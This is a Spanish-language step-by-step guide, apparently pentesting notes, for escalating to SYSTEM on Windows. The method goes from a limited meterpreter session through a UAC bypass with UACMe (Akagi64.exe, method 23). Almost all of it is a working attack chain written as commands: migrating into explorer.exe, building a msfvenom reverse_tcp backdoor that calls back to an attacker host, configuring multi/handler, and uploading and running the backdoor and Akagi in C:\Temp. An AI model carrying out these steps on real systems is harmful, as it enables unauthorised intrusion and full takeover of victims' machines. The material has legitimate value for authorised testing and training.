# Escalada de privilegios en Windows con UAC bypass y UACMe (Akagi)

---

## Resumen
Este método escala privilegios desde una sesión `meterpreter` limitada usando un bypass de UAC para ejecutar una backdoor con permisos elevados (SYSTEM).  
Utiliza la herramienta **UACMe (Akagi64.exe)** para saltarse UAC y ejecutar el payload.

---

#  Identificar si se puede hacer esta escalada

 Tienes una sesión `meterpreter` como usuario que está en el grupo Administradores pero con UAC activo.  
 Verificas que UAC está activado porque no puedes, por ejemplo, cambiar la contraseña del administrador desde la shell.

---

# Pasos completos

---

## Tener sesión de `meterpreter` en el usuario limitado
Comprueba quién eres:
```
whoami
```

---

## Buscar el proceso `explorer.exe` y migrar
Para no perder la sesión, migra a un proceso estable como `explorer.exe`.

### Buscar PID de `explorer.exe`:
```
ps | grep explorer
```

Ejemplo: si devuelve PID `2448`, migramos:
```
migrate 2448
```

---

## Abrir una shell en el sistema
Desde `meterpreter`:
```
shell
```

Ver los usuarios:
```
net user
```

Intentar cambiar la contraseña del administrador (fallará por UAC):
```
net user administrator password123
```

---

## Crear un payload con `msfvenom`
Genera una backdoor que se conectará a tu máquina con privilegios elevados:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<PUERTO> -f exe > backdoor.exe
```

---

## Preparar el `multi/handler` en otra consola

### Mantener la sesión original
Pon la sesión actual en segundo plano:
```
background
```

Ver las sesiones activas:
```
sessions -l
```

Puedes volver a ella más tarde con:
```
sessions -i <número de sesión>
```

---

### Abrir otra consola y configurar el handler
En otra terminal:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <TU_IP>
set LPORT <PUERTO>
exploit
```
Esto quedará a la espera de la conexión de la backdoor.

---

## Subir los archivos necesarios

En la consola con la sesión original:
### Crear carpeta temporal en C:
```
mkdir C:\Temp
```

Subir la backdoor:
```
upload backdoor.exe C:\\Temp\\backdoor.exe
```

Subir la herramienta UACMe (`Akagi64.exe`):
```
upload /root/Desktop/tools/UACME/Akagi64.exe C:\\Temp\\Akagi64.exe
```

---

##  Ejecutar UACMe para lanzar la backdoor con privilegios elevados
Abre una shell y ejecuta UACMe con el método `23` apuntando a la backdoor:
```
shell
cd C:\Temp
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

---

##  Recuperar la sesión elevada
En la segunda consola, donde tienes el `multi/handler`, deberías recibir una nueva sesión con privilegios elevados.

Verifica que ahora eres SYSTEM:
```
getuid
```

---

# Resumen de comandos clave

| Paso                                    | Comando / Acción                                        |
|----------------------------------------|---------------------------------------------------------|
| Ver usuario actual                     | `whoami`                                                |
| Buscar `explorer.exe`                  | `ps | grep explorer`                                    |
| Migrar a `explorer.exe`                | `migrate 2448`                                          |
| Abrir shell                            | `shell`                                                 |
| Ver usuarios                           | `net user`                                              |
| Intentar cambiar contraseña            | `net user administrator password123`                   |
| Crear backdoor                         | `msfvenom -p windows/meterpreter/reverse_tcp ...`      |
| Mantener sesión original              | `background` + `sessions -l` + `sessions -i <id>`     |
| Abrir handler en otra consola          | `use multi/handler` y configurar payload, `exploit`   |
| Crear carpeta en víctima               | `mkdir C:\Temp`                                         |
| Subir backdoor                         | `upload backdoor.exe C:\\Temp\\backdoor.exe`           |
| Subir Akagi                            | `upload Akagi64.exe C:\\Temp\\Akagi64.exe`             |
| Ejecutar UACMe                         | `.\Akagi64.exe 23 C:\Temp\backdoor.exe`                |
| Verificar sesión elevada               | `getuid`                                               |
